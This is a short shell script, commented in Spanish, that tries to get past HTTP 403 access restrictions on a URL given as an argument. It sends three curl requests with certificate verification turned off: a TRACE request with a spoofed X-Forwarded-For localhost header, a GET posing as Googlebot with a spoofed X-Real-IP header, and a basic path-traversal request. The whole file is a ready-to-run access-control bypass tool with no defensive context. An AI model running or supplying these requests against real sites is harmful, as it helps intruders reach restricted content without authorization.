#!/bin/sh


URL="$1"
DOMAIN=$(echo "$URL" | sed 's|https*://||' | sed 's|/.*||')

echo "Bypass 403 rápido para: $URL"

# 1. TRACE con X-Forwarded-For
curl -k -s --http1.0 -X "TRACE" -H "X-Forwarded-For: 127.0.0.1" "$URL"

# 2. GET como Googlebot
curl -k -s "$URL" -H "User-Agent: Googlebot/2.1" -H "X-Real-IP: 127.0.0.1"

# 3. Path traversal básico
curl -k -s "${URL}/.." -H "X-Forwarded-For: 127.0.0.1"
